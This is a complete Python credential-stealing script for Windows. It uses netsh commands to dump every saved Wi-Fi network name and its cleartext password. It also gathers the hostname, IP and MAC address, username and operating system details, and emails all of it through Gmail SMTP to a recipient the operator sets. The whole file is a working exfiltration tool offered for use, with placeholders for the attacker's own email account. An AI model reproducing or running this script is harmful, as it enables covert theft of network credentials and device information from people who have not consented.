import subprocess, os, sys, smtplib, re, socket, uuid

# Replace with the below details with your own
email_address = 'your email address'
email_password = 'your gmail app password'
recipient_email = 'email that will recive the data'

# Lists and regex
found_ssids = []
pwnd = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"

# Use Python to execute Windows command
get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

# Append found SSIDs to list
matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
for match in matches:
    for group in match.groups():
        found_ssids.append(group.strip())

# Get cleartext password for found SSIDs and place into pwnd list
for ssid in found_ssids:
    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode(encoding='utf-8', errors='ignore')

    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            pwnd.append({
                "SSID":ssid,
                "Password":group.strip()
                })

# Check if any pwnd Wi-Fi exists, if not exit
if len(pwnd) == 0:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

# Get system information
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
user_name = os.getlogin()
system_name = os.name
system_model = subprocess.check_output(["wmic", "computersystem", "get", "model"]).decode().split("\n")[1].strip()
operating_system = subprocess.check_output(["wmic", "os", "get", "Caption"]).decode().split("\n")[1].strip()
operating_system_version = subprocess.check_output(["wmic", "os", "get", "Version"]).decode().split("\n")[1].strip()

# Construct email message
message = "Device Information:\n\n"
message += f"Hostname: {hostname}\n"
message += f"IP Address: {ip_address}\n"
message += f"MAC Address: {mac_address}\n"
message += f"User Name: {user_name}\n"
message += f"System Name: {system_name}\n"
message += f"System Model: {system_model}\n"
message += f"Operating System: {operating_system}\n"
message += f"Operating System Version: {operating_system_version}\n\n"
message += "Wi-Fi Profiles:\n\n"
for pwnd_ssid in pwnd:
    message += f"SSID: {pwnd_ssid['SSID']}\n"
    message += f"Password: {pwnd_ssid['Password']}\n\n"

# Send the email
try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, recipient_email, f"Subject: Wi-Fi Passwords and System Information\n\n{message}")
    print("Email sent!")

except Exception as e:
    print("Error: ", e)
finally:
    server.quit()

